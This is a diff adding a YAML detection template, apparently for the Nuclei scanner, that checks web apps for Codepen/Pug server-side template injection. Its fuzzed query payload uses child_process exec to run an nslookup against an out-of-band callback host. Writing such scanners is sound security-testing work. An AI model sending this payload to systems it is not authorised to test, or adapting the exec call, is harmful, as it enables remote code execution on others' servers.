@@ -1,0 +1,37 @@
+id: codepen-oob
+
+info:
+  name: Codepen - Out of Band Template Injection
+  author: ritikchaddha
+  severity: high
+  reference:
+    - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Java.md#codepen
+  metadata:
+    verified: true
+  tags: ssti,dast,oast,oob
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      injection:
+        - "-%20var%20x%3Droot.process%20-%20x%3Dx.mainModule.require%20-%20x%3Dx(%27child_process%27)%20%3D%20x.exec(%27nslookup%20-type%3DSRV%20{{interactsh-url}}%27)"
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{injection}}"
+
+    matchers:
+      - type: dsl
+        name: request-matcher
+        dsl:
+          - "contains(interactsh_protocol,'dns')"
+          - "contains(interactsh_request,'srv')"
+        condition: and
+# digest: 490a0046304402201cc122332f3c98014cdaa0a48408214d6907250a67fd300276c16d4281923d8a0220489b6d635f7e4db27abfa366a85e62646b8ca7ece0b96ce5243d8dd3403ece45:922c64590222798bb761d5b6d8e72950
